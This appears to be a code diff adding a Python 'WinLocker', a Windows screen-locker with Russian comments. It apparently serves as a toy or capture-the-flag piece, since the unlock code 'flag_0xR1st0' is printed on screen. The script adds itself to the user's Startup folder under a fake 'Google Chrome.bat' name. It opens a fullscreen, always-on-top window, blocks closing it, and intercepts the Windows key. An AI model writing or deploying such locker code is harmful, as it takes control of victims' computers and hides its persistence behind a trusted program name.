@@ -1,0 +1,102 @@
+from playsound import *
+import tkinter
+from tkinter import *
+import tkinter as tk
+from tkinter import ttk
+import getpass
+import sys
+import os
+import os.path
+import pyautogui
+from time import sleep
+import keyboard
+
+USER_NAME = getpass.getuser()
+
+window = Tk() #тип окна 
+window.title("WinLocker") #наименование окна 
+window.geometry('1920x1080') #размер окна 
+window['bg'] = 'black' #цвет окна 
+
+######################### НУ КАК ЭТО БЫВАЕТ ЭТУ ЧАСТЬ Я СПИЗДИЛ #####################################
+normal_width = 1920
+normal_height = 1080
+
+screen_width = window.winfo_screenwidth()
+screen_height = window.winfo_screenheight()
+
+percentage_width = screen_width / (normal_width / 100)
+percentage_height = screen_height / (normal_height / 100)
+
+scale_factor = ((percentage_width + percentage_height) / 2) / 100
+
+fontsize = int(20 * scale_factor)
+minimum_size = 10
+if fontsize < minimum_size:
+    fontsize = minimum_size
+
+fontsizeHding = int(72 * scale_factor)
+minimum_size = 40
+if fontsizeHding < minimum_size:
+   fontsizeHding = minimum_size
+
+default_style = ttk.Style()
+default_style.configure('New.TButton', font=("Helvetica", fontsize))
+# ТУТ МЫ ЕСЛИ ЧТО ДЕЛАЕМ ПОЛНОЭКРАННОЕ ОКНО ДЛЯ ЛЮБОГО МОНИТОРА 
+########################################### ВСЁ ДАЛЬШЕ НАВЕРНОЕ ТАК ДЕЛАТЬ НЕ БУДУ ##########################
+
+# Добавляемна автозапуск
+def add_to_startup(file_path=""):
+    if file_path == "":
+        file_path = os.path.dirname(os.path.realpath(__file__))
+    bat_path = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % USER_NAME
+    with open(bat_path + '\\' + "Google Chrome.bat", "w+") as bat_file:
+        bat_file.write(r'start "" %s' % file_path)
+# не даёт нам закрыть окно путём Alt + F4
+def block():
+    pyautogui.moveTo(x=680,y=800)
+    window.protocol("WM_DELETE_WINDOW",block)
+    window.update()
+# чтобы окно выводилось на целый экран и было всегда на переднем плане
+def fullscreen():
+    window.attributes('-fullscreen', True, '-topmost', True)
+# проверяем пароль на правильность
+def clicked():
+    res = format(txt.get())
+    if res == 'flag_0xR1st0':
+        file_path = '/tmp/file.txt'
+        file_path = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Google Chrome.bat' % USER_NAME
+        os.remove(file_path)
+        sys.exit()
+
+add_to_startup("C:\\000\\main.pyw")
+fullscreen()
+
+#добавим текст
+txt_one = Label(window, text = 'WinLocker by Xristo', font=("Arial Bold", fontsizeHding), fg='red', bg='black')
+txt_two = Label(window, text = 'flag_0xR1st0', font=("Arial Bold", fontsizeHding), fg='red', bg='black')
+
+#используем grid чтобы текст вывелся на экран 
+txt_one.grid(column = 0, row = 0)
+txt_two.grid(column = 0, row = 0)
+
+#надоже структуризировать текст
+txt_one.place(relx = .01, rely = .01)
+txt_two.place(relx = .01, rely = .11)
+
+#выводим текст 
+txt = Entry(window)  
+btn = Button(window, text="ВВОД КОДА", command=clicked)  
+txt.place(relx = .28, rely = .5, relwidth=.3, relheight=.06)
+btn.place(relx = .62, rely = .5, relwidth=.1, relheight=.06)
+
+while True:
+    keyboard.wait("win")
+    keyboard.send("win")
+
+
+#не даём закрыть окно 
+block()
+
+
+window.mainloop() #чтобы окно не закрывалось сразу после загрузки
